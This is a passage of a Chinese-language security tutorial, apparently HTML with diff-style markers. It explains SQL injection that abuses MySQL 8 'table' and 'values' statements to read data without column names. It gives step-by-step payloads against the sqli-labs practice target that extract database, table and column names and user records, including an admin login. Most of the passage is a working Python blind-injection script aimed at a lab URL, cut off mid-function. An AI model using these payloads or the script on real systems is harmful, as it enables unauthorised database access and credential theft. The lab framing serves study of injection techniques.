+<span class="hljs-operator">|</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)) <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------------+</span>
+<span class="hljs-operator">|</span>                                     <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------------+</span>
+<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+
+mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">'D'</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>));
+<span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span>
+<span class="hljs-operator">|</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">'D'</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)) <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span>
+<span class="hljs-operator">|</span>                                      <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span>
+<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+</code></pre>
+<h5 id="h5-u9700u8981u6CE8u610Fu7684u5730u65B9">
+<a class="reference-link" name="%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9"></a>需要注意的地方</h5>
+<p>1.当前判断的所在列的后一列需要用<strong>字符</strong>表示，不能用数字，否则判断到当前列的最后一个字符会判断不出！</p>
+<p><img class="alignnone size-full wp-image-232299 aligncenter" alt="" width="487" height="367" data-original="https://p5.ssl.qhimg.com/t017fd6b3df74b7007e.png"></p>
+<p>2.最好用<code>&lt;=</code>替换<code>&lt;</code>，用&lt;比较一开始并没有问题，但到最后一位时结果为正确字符的前一个字符，用&lt;=结果更直观。</p>
+<p><img class="alignnone size-full wp-image-232300 aligncenter" alt="" width="529" height="362" data-original="https://p5.ssl.qhimg.com/t01c823d539e5c7a06c.png"></p>
+<p>最终判断过程如下：</p>
+<pre><code class="lang-sql hljs language-sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">'Dumb'</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>));
+<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+</span>
+<span class="hljs-operator">|</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">'Dumb'</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)) <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+</span>
+<span class="hljs-operator">|</span>                                          <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+</span>
+<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+
+mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">'Dumc'</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>));
+<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+</span>
+<span class="hljs-operator">|</span> ((<span class="hljs-number">1</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">'Dumc'</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)) <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+</span>
+<span class="hljs-operator">|</span>                                          <span class="hljs-number">0</span> <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+</span>
+<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)
+</code></pre>
+<h3 name="h3-10" id="h3-10">
+<a class="reference-link" name="2%E3%80%81%E5%9C%A8sqli-labs%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95"></a>2、在sqli-labs靶场测试</h3>
+<h4 id="h4-1-">
+<a class="reference-link" name="1.%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"></a>1.判断列数</h4>
+<p>使用经典的order by语句判断：</p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-number">1</span><span class="hljs-string">' order by 3--+   #正常
+1'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">--+   #显示Unknown column '4' in 'order clause'</span>
+</code></pre>
+<p>说明有3列</p>
+<h4 id="h4-2-values-">
+<a class="reference-link" name="2.%E4%BD%BF%E7%94%A8values%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D"></a>2.使用values判断回显位</h4>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-number">-1</span><span class="hljs-string">' union values row(1,2,3)--+
+</span></code></pre>
+<p><img class="alignnone size-full wp-image-232301 aligncenter" alt="" width="305" height="116" data-original="https://p3.ssl.qhimg.com/t017ddcfde5482f74e1.png"></p>
+<h4 id="h4-3-">
+<a class="reference-link" name="3.%E7%88%86%E5%BA%93%E7%88%86%E8%A1%A8%E7%88%86%E5%AD%97%E6%AE%B5%E7%88%86%E6%95%B0%E6%8D%AE"></a>3.爆库爆表爆字段爆数据</h4>
+<p><strong>（1）爆当前数据库</strong></p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-number">-1</span><span class="hljs-string">' union values row(1,database(),3)--+
+#或利用盲注1'</span> <span class="hljs-keyword">and</span> ascii(substr((database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span><span class="hljs-comment">--+   即s</span>
+</code></pre>
+<p><strong>（2）爆所有数据库</strong><br>
+因为table不能像select控制列数，除非列数一样的表，不然都回显不出来。<br>
+需要使用table查询配合无列名盲注<br><code>information_schema.schemata</code>表有6列<br>
+因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名</p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-number">1</span><span class="hljs-string">' and ('</span>def<span class="hljs-string">','</span>m<span class="hljs-string">','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常
+1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-string">'def'</span>,<span class="hljs-string">'n'</span>,<span class="hljs-string">''</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> information_schema.schemata limit <span class="hljs-number">1</span>)<span class="hljs-comment">--+ #回显错误</span>
+#得到第<span class="hljs-number">1</span>个数据库名的第一个字符为m
+......
+<span class="hljs-number">1</span><span class="hljs-string">' and ('</span>def<span class="hljs-string">','</span>mysql<span class="hljs-string">','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常
+1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-string">'def'</span>,<span class="hljs-string">'mysqm'</span>,<span class="hljs-string">''</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> information_schema.schemata limit <span class="hljs-number">1</span>)<span class="hljs-comment">--+ #回显错误</span>
+</code></pre>
+<p>说明第1个数据库名为<code>mysql</code></p>
+<p><img class="alignnone size-full wp-image-232302 aligncenter" alt="" width="719" height="318" data-original="https://p0.ssl.qhimg.com/t01e6b3cad456ca2d07.png"></p>
+<p><img class="alignnone size-full wp-image-232303 aligncenter" alt="" width="698" height="286" data-original="https://p0.ssl.qhimg.com/t017df11354bc8490f0.png"></p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-number">1</span><span class="hljs-string">' and ('</span>def<span class="hljs-string">','</span>information_schema<span class="hljs-string">','',4,5,6)&lt;=(table information_schema.schemata limit 1,1)--+ #回显正常
+1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-string">'def'</span>,<span class="hljs-string">'information_schemb'</span>,<span class="hljs-string">''</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> information_schema.schemata limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">--+ #回显错误</span>
+#说明第<span class="hljs-number">2</span>个数据库名为information_schema
+......
+一直猜解，直到获得全部数据库名
+</code></pre>
+<p><strong>（3）爆数据表</strong><br><code>information_schema.tables</code>表有21列</p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-number">1</span><span class="hljs-string">' and ('</span>def<span class="hljs-string">','</span>security<span class="hljs-string">','</span>users<span class="hljs-string">','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 317,1)--+ #第一个表users
+
+1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-string">'def'</span>,<span class="hljs-string">'security'</span>,<span class="hljs-string">'emails'</span>,<span class="hljs-string">''</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> information_schema.tables limit <span class="hljs-number">318</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">--+ #第二个表emails</span>
+
+<span class="hljs-number">1</span><span class="hljs-string">' and ('</span>def<span class="hljs-string">','</span>security<span class="hljs-string">','</span>uagents<span class="hljs-string">','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 319,1)--+ #第三个表uagents
+
+1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-string">'def'</span>,<span class="hljs-string">'security'</span>,<span class="hljs-string">'referers'</span>,<span class="hljs-string">''</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> information_schema.tables limit <span class="hljs-number">320</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">--+ #第四个表referers</span>
+</code></pre>
+<p>前两个字段都是确定的，可以写一个for循环判断，如果结果为真，代表从那行开始(这里是<code>limit 317,1</code>，即第318行)，然后盲注第三个列。<br><strong>（4）爆字段名</strong><br><code>information_schema.columns</code>表有22列<br>
+得到所有表名后开始判断字段名，找到columns表，具体方法和上面一样</p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-number">1</span><span class="hljs-string">' and ('</span>def<span class="hljs-string">','</span>security<span class="hljs-string">','</span>users<span class="hljs-string">','</span>id<span class="hljs-string">','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3386,1)--+ #users表第一个字段为id
+
+1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-string">'def'</span>,<span class="hljs-string">'security'</span>,<span class="hljs-string">'users'</span>,<span class="hljs-string">'password'</span>,<span class="hljs-string">''</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> information_schema.columns limit <span class="hljs-number">3387</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">--+ #users表，第二个字段为password</span>
+
+<span class="hljs-number">1</span><span class="hljs-string">' and ('</span>def<span class="hljs-string">','</span>security<span class="hljs-string">','</span>users<span class="hljs-string">','</span>username<span class="hljs-string">','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3388,1)--+ #users表，第三个字段为username
+</span></code></pre>
+<p><strong>（3）爆数据</strong></p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-number">1</span><span class="hljs-string">' and (1,'</span>D<span class="hljs-string">','')&lt;=(table users limit 1)--+ #正常
+1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-number">1</span>,<span class="hljs-string">'E'</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)<span class="hljs-comment">--+ #错误</span>
+
+#<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>也就是<span class="hljs-keyword">table</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>
+#<span class="hljs-number">1</span><span class="hljs-string">' and (1,'</span>D<span class="hljs-string">','')&lt;=(table users limit 0,1)--+ #正常
+#1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-number">1</span>,<span class="hljs-string">'E'</span>,<span class="hljs-string">''</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">--+ #错误</span>
+......
+<span class="hljs-number">1</span><span class="hljs-string">' and (1,'</span>Dumb<span class="hljs-string">','</span>Dumb<span class="hljs-string">')&lt;=(table users limit 1)--+ #正常
+1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-number">1</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">'Dumc'</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">1</span>)<span class="hljs-comment">--+ #错误</span>
+</code></pre>
+<p>得到第1个记录为<code>1 Dumb Dumb</code></p>
+<pre><code class="lang-sql hljs language-sql"><span class="hljs-number">1</span><span class="hljs-string">' and (8,'</span>admin<span class="hljs-string">','</span>admin<span class="hljs-string">')&lt;=(table users limit 7,1)--+ #正常
+1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-number">8</span>,<span class="hljs-string">'admin'</span>,<span class="hljs-string">'admio'</span>)<span class="hljs-operator">&lt;=</span>(<span class="hljs-keyword">table</span> users limit <span class="hljs-number">7</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">--+ #错误</span>
+</code></pre>
+<p>得到第8个记录为<code>8 admin admin</code><br>
+一步一步注出数据</p>
+<p>&nbsp;</p>
+<h2 name="h2-11" id="h2-11">0x05 脚本编写</h2>
+<p>一个一个手注，似乎有点麻烦。自己于是尝试写个脚本：</p>
+<pre><code class="lang-py hljs language-python"><span class="hljs-string">'''
+@author qwzf
+@desc 本脚本是用于mysql 8新特性的sql注入
+@date 2021/02/18
+'''</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> string
+
+url = <span class="hljs-string">'http://121.41.231.75:8002/Less-8/?id='</span>
+chars=string.ascii_letters+string.digits+<span class="hljs-string">"@{}_-?"</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">current_db</span>(<span class="hljs-params">url</span>):
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"利用mysql8新特性或普通布尔盲注:\n1.新特性(联合查询) 2.普通布尔盲注"</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入序号:"</span>,end=<span class="hljs-string">''</span>)
+    num = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())
+    <span class="hljs-keyword">if</span> num == <span class="hljs-number">1</span>:
+        payload = <span class="hljs-string">"-1' union values row(1,database(),3)--+"</span>  <span class="hljs-comment">#联合查询爆当前数据库(可修改)</span>
+        urls = url + payload
+        r = requests.get(url=urls)
+        <span class="hljs-built_in">print</span>(r.text)
+    <span class="hljs-keyword">else</span>:
+        name=<span class="hljs-string">''</span>
+        payload = <span class="hljs-string">"1' and ascii(substr((database()),{0},1))={1}--+"</span> <span class="hljs-comment">#布尔盲注爆当前数据库(可修改)</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
+            char=<span class="hljs-string">''</span>
+            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> chars:
+                payloads = payload.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(j))
+                urls = url + payloads
+                r = requests.get(url=urls)
+                <span class="hljs-keyword">if</span> <span class="hljs-string">"You are in"</span> <span class="hljs-keyword">in</span> r.text:
+                    name += j
+                    <span class="hljs-built_in">print</span>(name)
+                    char = j
+                    <span class="hljs-keyword">break</span>
+            <span class="hljs-keyword">if</span> char == <span class="hljs-string">''</span>:
+                <span class="hljs-keyword">break</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params">name</span>):
+    res = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> name:
+        res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
+    res = <span class="hljs-string">'0x'</span> + res.replace(<span class="hljs-string">'0x'</span>,<span class="hljs-string">''</span>)
+    <span class="hljs-keyword">return</span> res
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">dbs</span>(<span class="hljs-params">url</span>): <span class="hljs-comment">#无列名盲注爆所有数据库(可修改)</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入要爆第几个数据库，如：1,2等:"</span>,end=<span class="hljs-string">''</span>)
+        x = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())-<span class="hljs-number">1</span>
+        num = <span class="hljs-built_in">str</span>(x)
+        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:
+            <span class="hljs-keyword">break</span>
+        payload = <span class="hljs-string">"1' and ('def',{},'',4,5,6)&gt;(table information_schema.schemata limit "</span>+num+<span class="hljs-string">",1)--+"</span>
+        name = <span class="hljs-string">''</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):
+            hexchar = <span class="hljs-string">''</span>
+            <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):
+                hexchar = str2hex(name + <span class="hljs-built_in">chr</span>(char))
+                payloads = payload.<span class="hljs-built_in">format</span>(hexchar)
+                <span class="hljs-comment">#print(payloads)</span>
+                urls = url + payloads
+                r = requests.get(url=urls)
+                <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in'</span> <span class="hljs-keyword">in</span> r.text:
+                    name += <span class="hljs-built_in">chr</span>(char-<span class="hljs-number">1</span>)
+                    <span class="hljs-built_in">print</span>(name)
+                    <span class="hljs-keyword">break</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">tables_n</span>(<span class="hljs-params">url,database</span>): <span class="hljs-comment">#无列名盲注爆数据表开始行数(可修改)</span>
+    payload = <span class="hljs-string">"1' and ('def','"</span>+database+<span class="hljs-string">"','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit {},1)--+"</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10000</span>):
+        payloads = payload.<span class="hljs-built_in">format</span>(i)
+        urls = url + payloads
+        r = requests.get(url=urls)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in'</span> <span class="hljs-keyword">in</span> r.text:
+            char = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(database[-<span class="hljs-number">1</span>])+<span class="hljs-number">1</span>)
+            database = database[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]+char
+            payld = <span class="hljs-string">"1' and ('def','"</span>+database+<span class="hljs-string">"','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit "</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">",1)--+"</span>
+            urls = url + payld
+            res = requests.get(url=urls)
+            <span class="hljs-comment">#print(i)</span>
+            <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text:
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">'从第'</span>,i,<span class="hljs-string">'行开始爆数据表'</span>)   <span class="hljs-comment">#判断开始行数</span>
+                n = i
+                <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">return</span> n
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">tables</span>(<span class="hljs-params">url,database,n</span>):  <span class="hljs-comment">#无列名盲注爆数据表(可修改)</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入要爆第几个数据表，如：1,2等:"</span>,end=<span class="hljs-string">''</span>)
+        x = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())-<span class="hljs-number">1</span>
+        num = <span class="hljs-built_in">str</span>(x + n)
+        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:
+            <span class="hljs-keyword">break</span>
+        payload = <span class="hljs-string">"1' and ('def','"</span>+database+<span class="hljs-string">"',{},'',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit "</span>+num+<span class="hljs-string">",1)--+"</span>
+        name = <span class="hljs-string">''</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):
+            hexchar = <span class="hljs-string">''</span>
+            <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):
+                hexchar = str2hex(name + <span class="hljs-built_in">chr</span>(char))
+                payloads = payload.<span class="hljs-built_in">format</span>(hexchar)
+                <span class="hljs-comment">#print(payloads)</span>
+                urls = url + payloads
+                r = requests.get(url=urls)
+                <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in'</span> <span class="hljs-keyword">in</span> r.text:
+                    name += <span class="hljs-built_in">chr</span>(char-<span class="hljs-number">1</span>)
+                    <span class="hljs-built_in">print</span>(name)
+                    <span class="hljs-keyword">break</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">columns_n</span>(<span class="hljs-params">url,database,table</span>): <span class="hljs-comment">#无列名盲注爆字段开始行数(可修改)</span>
+    payload = <span class="hljs-string">"1' and ('def','"</span>+database+<span class="hljs-string">"','"</span>+table+<span class="hljs-string">"','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit {},1)--+"</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3000</span>,<span class="hljs-number">10000</span>):
+        payloads = payload.<span class="hljs-built_in">format</span>(i)
+        urls = url + payloads
+        r = requests.get(url=urls)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in'</span> <span class="hljs-keyword">in</span> r.text:
+            char = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(table[-<span class="hljs-number">1</span>])+<span class="hljs-number">1</span>)
+            table = table[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]+char
+            payld = <span class="hljs-string">"1' and ('def','"</span>+database+<span class="hljs-string">"','"</span>+table+<span class="hljs-string">"','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit "</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">",1)--+"</span>
+            urls = url + payld
+            res = requests.get(url=urls)
+            <span class="hljs-comment">#print(i)</span>
+            <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text:
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">'从第'</span>,i,<span class="hljs-string">'行开始爆字段'</span>)   <span class="hljs-comment">#判断开始行数</span>
+                n = i
+                <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">return</span> n
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">columns</span>(<span class="hljs-params">url,database,table,n</span>):  <span class="hljs-comment">#无列名盲注爆字段值(可修改)</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入要爆第几个字段，如：1,2等:"</span>,end=<span class="hljs-string">''</span>)
+        x = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())-<span class="hljs-number">1</span>
+        num = <span class="hljs-built_in">str</span>(x + n)
+        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:
+            <span class="hljs-keyword">break</span>
+        payload = <span class="hljs-string">"1' and ('def','"</span>+database+<span class="hljs-string">"','"</span>+table+<span class="hljs-string">"',{},'',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit "</span>+num+<span class="hljs-string">",1)--+"</span>
+        name = <span class="hljs-string">''</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):
+            hexchar = <span class="hljs-string">''</span>
+            <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):
+                hexchar = str2hex(name + <span class="hljs-built_in">chr</span>(char))
+                payloads = payload.<span class="hljs-built_in">format</span>(hexchar)
+                <span class="hljs-comment">#print(payloads)</span>
+                urls = url + payloads
+                r = requests.get(url=urls)
+                <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in'</span> <span class="hljs-keyword">in</span> r.text:
+                    name += <span class="hljs-built_in">chr</span>(char-<span class="hljs-number">1</span>)
+                    <span class="hljs-built_in">print</span>(name)
+                    <span class="hljs-keyword">break</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">datas</span>(<span class="hljs-params">url,table</span>):  <span class="hljs-comment">#无列名盲注爆数据(可修改)</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入要爆第几个数据，如：1,2等:"</span>,end=<span class="hljs-string">''</span>)
+        x = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())
+        y = x-<span class="hljs-number">1</span>
+        num = <span class="hljs-built_in">str</span>(y)
+        <span class="hljs-keyword">if</span> y &lt; <span class="hljs-number">0</span>:
+            <span class="hljs-keyword">break</span>
+        payload = <span class="hljs-string">"1' and ("</span>+<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">",{},'')&gt;(table "</span>+table+<span class="hljs-string">" limit "</span>+num+<span class="hljs-string">",1)--+"</span>
+        name = <span class="hljs-string">''</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):
+            hexchar = <span class="hljs-string">''</span>
+            <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):
+                hexchar = str2hex(name + <span class="hljs-built_in">chr</span>(char))
+                payloads = payload.<span class="hljs-built_in">format</span>(hexchar)
+                <span class="hljs-comment">#print(payloads)</span>
+                urls = url + payloads
+                r = requests.get(url=urls)
+                <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in'</span> <span class="hljs-keyword">in</span> r.text:
